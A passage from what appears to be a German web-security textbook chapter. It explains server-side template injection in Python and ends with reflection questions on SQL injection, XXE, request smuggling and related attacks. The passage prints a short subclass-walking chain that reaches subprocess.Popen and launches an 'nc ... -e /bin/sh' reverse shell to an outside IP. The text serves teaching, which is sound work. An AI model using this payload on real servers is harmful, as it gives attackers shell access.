Angreifer zu einem Objekt bzw. zu einer Klasse gelanten, welche ihm die
Ausführung von Code am Server erlaubt.

In Python kann über das Attribut \_\_class\_\_ auf die Klasse eines
Objekts zugegriffen werden, die Methode mro liefert sowohl die eigene
Klasse als auch alle Elternklassen eines Objektes:

    somelist = [1,2,3]
    somelist.__class__         # -> <type 'list'>
    somelist.__class__.mro()   # -> [<type 'list'>, <type 'object'>]
    obj_class = somelist.__class__.mro()[1]

Somit erhaltne wir über ,,somelist.\_\_class\_\_.mro()” alle Klassen
(inklusive vererbter Klassen) des Objekts ,,somelist”. In Python erben
alle Klassen von der Elternklasse ,,Object” welche wir über die
Array-Position 1 selektieren und der Variablen ,,obj\_class” zuweisen.
Klassen in Python besitzen die Methode ,,\_\_subclasses\_\_” welche eine
Liste von allen aktuell bekannten Subklassen zurück liefert. Diese Liste
ist dynamisch sowohl die Elemente, als auch die Reihung jener, kann zur
Laufzeit variieren.

Ein Angreifer kann diese Liste ausgeben und eine potentiell verwundbare
Klasse, wie z.B. ,,subprocess.Popen” suchen und über den Index diese
Klasse selektionen. Nehmen wir an, dass diese Klasse in unserem Beispiel
auf Array Position 42 vorhandne war. Durch Hinzufügen von ,,()” wird nun
der Konstruktor der Klasse aufgerufen, hierbei können Parameter
angegeben werden. Bei ,,Popen” kann ein Array mit Parametern übergeben
werden. Diese werden zusammenkopiert und beim Aufruf des Konstruktors
als Systemkommando ausgeführt:

    obj_class = somelist.__class__.mro()[1]
    obj_class.__subclasses__()[42]   # -> <class 'subprocess.Popen'>
    obj_class.__subclasses__[42](["nc", "10.0.0.1", "443", "-e", "/bin/sh"])

Bei diesem Beispiel wird somit als Kommando ,,ns 10.0.0.1 443 -e
/bin/sh” aufgerufen: dieses Kommando baut eine reverse-shell auf, ein
Angreifer erhält auf diese Weise Shell-Zugriff auf den Server mit den
Rechten der Web-Applikation.

Webapplikationen versuchen häufig, Benutzereingaben in Templates auf
Schadcode hin zu überprüfen. Dies ist problematisch da Templates viele
Möglichkeiten bieten, Schadcode zu verschleiern und auf diese Weise
Absicherungen zu umgehen[9]. Als Angreifer sucht man in diesem Fall am
Besten nach ,,bypass” und dem Namen der verwendeten Template-Engine.

Ein Exploit gegen ein Template-System kann selten zu 100% statisch
erfolgen da die Liste der Subklassen von ,,Object” dynamisch ist: sowohl
die Elemente als auch deren Position ist von der Laufzeitumgebung
abhängig und kann sich bei jedem Start der Webapplikation verändern. Ein
Angreifer wird daher zumeist mehrstufig vorgehen und nach Erlangen des
Zugriffs auf das CMS initial versuchen aussichtsreiche Objekt-Klassen
und deren Position (im Subklassen-Array) zu identifizieren. Anschließend
wird er versuchen, erfolgversprechende Klassen zu instanzieren und auf
diese Weise Schadcode auszuführen.

## Reflektionsfragen

1.  Wie funktioniert eine SQL union-based Injection? Womit können
    SQL-Injections vermieden werden?

2.  Wie funktioniert eine SQL time-based Injection? Womit können
    SQL-Injections vermieden werden?

3.  Warum sollten SQL prepared statements verwendet werden?

4.  Was versteht man unter einer Serialisierungs-Schwachstelle? Welche
    negativen Auswirkungen können Serialisierungsangriffe auf eine
    Applikation besitzen?

5.  Was versteht man unter XML External Entity Attacks? Welche negativen
    Auswirkungen auf die Applikation können erzielt werden und welche
    Gegenmaßnahmen sind möglich?

6.  Welche Probleme können beim Upload eines Files auf einen Webserver
    auftreten? Welche Best-Practises im Zusammenhang mit File-Uploads
    sollten beachtet werden?

7.  Unterschied der Angriffsvektoren mit einem File, dass serverseitig
    exekutierten Code enthält und einem File, dass client-seitig
    exekutierten Code enthält?

8.  Wie können Path-Traversal Angriffe eingesetzt werden?

9.  Erläutere LDAP-Injections.

10. Welche Schwachstelle wird bei Type-Juggling Angriffen ausgenutzt?
    Erläutere ein solches Beispiel.

11. Was versteht man unter HTTP Request Smuggling?

12. Erläutere Server-Side Template Injection (SSTI).

[1] Diese werden im Kapitel Injection Attacks erklärt.

[2] Structured Query Language

[3] Würde man die *?*-basierte Methode verwenden, muss man bei jeder
Änderung des Query-Strings überprüfen, ob die Reihenfolge der
dynamischen Parameter ident geblieben ist.

[4] <https://www.netsparker.com/blog/web-security/ldap-injection-how-to-prevent/>

[5] <https://github.com/ikkisoft/SerialKiller>

[6] Aus dem exzellenten PortSwigger-Tutorial unter
<https://portswigger.net/web-security/request-smuggling>.

[7] Quelle:
<https://portswigger.net/web-security/request-smuggling/exploiting>

[8] <https://jinja.palletsprojects.com/>

[9] siehe auch
<https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/>
